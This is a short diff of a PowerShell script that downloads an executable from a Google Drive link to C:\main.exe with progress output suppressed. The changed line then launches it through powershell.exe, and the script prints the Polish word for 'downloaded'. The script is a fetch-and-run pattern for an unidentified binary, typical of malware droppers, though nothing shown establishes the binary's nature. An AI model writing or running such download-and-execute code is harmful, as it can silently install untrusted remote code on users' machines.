@@ -19,5 +19,5 @@ $source = 'https://drive.google.com/u/8/uc?id=1sVWGSv0z0kxDindHruAM6P6alLBiz6ad&
 $ProgressPreference = 'SilentlyContinue'
 $destination = 'C:\main.exe'
 Invoke-RestMethod -Uri $source -OutFile $destination
-Start-Process -FilePath "C\main.exe" -Noexit
+Start-Process powershell.exe -ArgumentList 'C:\main.exe'
 Write-Output "Pobrane"
